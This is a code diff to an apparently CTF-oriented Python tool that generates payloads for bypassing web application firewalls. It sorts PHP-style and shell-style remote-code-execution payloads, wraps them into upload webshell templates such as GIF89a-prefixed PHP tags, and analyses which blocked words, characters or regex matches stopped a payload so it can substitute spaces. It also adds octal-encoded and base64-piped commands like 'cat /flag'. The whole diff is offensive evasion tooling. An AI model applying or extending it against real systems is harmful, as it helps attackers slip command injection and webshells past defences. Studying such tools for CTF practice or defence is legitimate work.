@@ -136,7 +136,87 @@ def _render_upload_wrapper(template: str, payload: str, expr: str):
     return template.format(payload=payload, expr=expr)
 
 
-def _apply_upload_wrappers(payloads, php_version: float):
+def _is_upload_wrapper_like_payload(payload: str):
+    normalized = payload.strip().lower()
+    if not normalized:
+        return False
+    if normalized.startswith("<?"):
+        return True
+    if normalized.startswith("<%"):
+        return True
+    if normalized.startswith('<script language="php">'):
+        return True
+    if normalized.startswith("gif89a<?"):
+        return True
+    if normalized.startswith("gif89a<%"):
+        return True
+    if normalized.startswith('gif89a<script language="php">'):
+        return True
+    if "<?" in normalized and "?>" in normalized:
+        return True
+    if "<%" in normalized and "%>" in normalized:
+        return True
+    if '<script language="php">' in normalized and "</script>" in normalized:
+        return True
+    return False
+
+
+def _is_php_style_payload(payload: str):
+    stripped = payload.strip()
+    lowered = stripped.lower()
+    if not stripped:
+        return False
+
+    if _is_upload_wrapper_like_payload(stripped):
+        return True
+
+    if lowered.startswith("`") and lowered.endswith("`"):
+        return True
+
+    php_prefixes = (
+        "phpinfo(",
+        "print_r(",
+        "var_dump(",
+        "var_export(",
+        "echo ",
+        "echo(",
+        "print(",
+        "show_source(",
+        "highlight_file(",
+        "readgzfile(",
+        "include ",
+        "include(",
+        "require ",
+        "require(",
+        "include_once(",
+        "require_once(",
+        "eval(",
+        "assert(",
+        "call_user_func(",
+        "die(",
+        "exit(",
+        "$",
+        "(~",
+    )
+    if lowered.startswith(php_prefixes):
+        return True
+
+    if "$_=" in lowered or "get_defined_vars" in lowered or "getallheaders" in lowered:
+        return True
+
+    return False
+
+
+def _is_shell_style_payload(payload: str):
+    stripped = payload.strip()
+    if not stripped:
+        return False
+    if _is_upload_wrapper_like_payload(stripped):
+        return False
+    return not _is_php_style_payload(stripped)
+
+
+def _apply_upload_php_wrappers(payloads, php_version: float):
     templates = list(bypass_data.SHORT_TAG_TEMPLATES)
     templates.extend(bypass_data.UPLOAD_MODERN_WRAPPER_TEMPLATES)
     if php_version < 7.0:
@@ -144,7 +224,9 @@ def _apply_upload_wrappers(payloads, php_version: float):
 
     wrapped = []
     for payload in payloads:
-        if ";" not in payload and "(" not in payload and "$_" not in payload:
+        if not _is_php_style_payload(payload):
+            continue
+        if _is_upload_wrapper_like_payload(payload):
             continue
         expr = _to_php_expr(payload)
         for template in templates:
@@ -152,6 +234,79 @@ def _apply_upload_wrappers(payloads, php_version: float):
             if rendered:
                 wrapped.append(rendered)
     return wrapped
+
+
+def _apply_upload_shell_wrappers(payloads):
+    wrapped = []
+    for payload in payloads:
+        if not _is_shell_style_payload(payload):
+            continue
+        cmd = payload.strip()
+        for template in bypass_data.UPLOAD_SHELL_CMD_WRAPPER_TEMPLATES:
+            wrapped.append(template.format(cmd=cmd))
+    return wrapped
+
+
+def _analyze_block_reasons(payload: str, waf_words, waf_chars, waf_regex):
+    reasons = {
+        "blocked_words": [],
+        "blocked_chars": [],
+        "regex_match": None,
+    }
+
+    lower_payload = payload.lower()
+    if waf_words:
+        for word in waf_words:
+            if word and word.lower() in lower_payload:
+                reasons["blocked_words"].append(word)
+
+    if waf_chars:
+        reasons["blocked_chars"] = [ch for ch in set(payload) if ch in waf_chars]
+
+    if waf_regex:
+        match = waf_regex.search(payload)
+        if match:
+            reasons["regex_match"] = match.group(0)
+
+    return reasons
+
+
+def _apply_space_replacements(payload: str):
+    if " " not in payload:
+        return [payload]
+
+    candidates = [payload]
+    for replacement in bypass_data.SPACE_BYPASS_REPLACEMENTS:
+        candidates.append(payload.replace(" ", replacement))
+    return utils.dedupe_preserve_order(candidates)
+
+
+def _is_space_blocked(reasons):
+    if " " in reasons["blocked_chars"]:
+        return True
+    if any(" " in word for word in reasons["blocked_words"]):
+        return True
+    regex_match = reasons["regex_match"]
+    if regex_match and " " in regex_match:
+        return True
+    return False
+
+
+def _apply_targeted_replacements(payload: str, waf_words, waf_chars, waf_regex):
+    reasons = _analyze_block_reasons(payload, waf_words, waf_chars, waf_regex)
+    candidates = [payload]
+
+    if _is_space_blocked(reasons):
+        candidates.extend(_apply_space_replacements(payload))
+
+    return utils.dedupe_preserve_order(candidates)
+
+
+def _build_targeted_candidates(payloads, waf_words, waf_chars, waf_regex):
+    targeted = []
+    for payload in payloads:
+        targeted.extend(_apply_targeted_replacements(payload, waf_words, waf_chars, waf_regex))
+    return utils.dedupe_preserve_order(targeted)
 
 
 def _append_increment_with_url(payloads, raw_payload: str):
@@ -294,25 +449,24 @@ def generate_candidates(options: BypassOptions):
             payloads.extend(_generate_php_rce_payloads(target_cmd, options.php_version))
 
     if options.upload:
-        payloads.extend(_apply_upload_wrappers(payloads.copy(), options.php_version))
+        raw_payloads = payloads.copy()
+        shell_wrapped = _apply_upload_shell_wrappers(raw_payloads)
+        php_wrapped = _apply_upload_php_wrappers(raw_payloads, options.php_version)
+        existing_wrapped = [p for p in raw_payloads if _is_upload_wrapper_like_payload(p)]
+        payloads = utils.dedupe_preserve_order(shell_wrapped + php_wrapped + existing_wrapped)
 
-    base_payloads = payloads.copy()
-    for payload in base_payloads:
-        if ";" not in payload and "(" not in payload:
-            payloads.append(_base64_pipe_bypass(payload))
+    if not options.upload:
+        base_payloads = payloads.copy()
+        for payload in base_payloads:
+            if ";" not in payload and "(" not in payload:
+                payloads.append(_base64_pipe_bypass(payload))
 
-    if not root_discovery_mode:
+    if not root_discovery_mode and not options.upload:
         simple_cmds = ["ls", "cat /flag", "tac /flag", "env"]
         for cmd in simple_cmds:
             payloads.append(_octal_encode(cmd))
 
-    candidates = payloads.copy()
-    for payload in payloads:
-        if " " in payload:
-            for template in bypass_data.SPACE_BYPASS_TEMPLATES:
-                candidates.append(template.format(payload=payload))
-
-    candidates = utils.dedupe_preserve_order(candidates)
+    candidates = utils.dedupe_preserve_order(payloads)
     candidates = [payload for payload in candidates if payload != "`/`"]
     return candidates
 
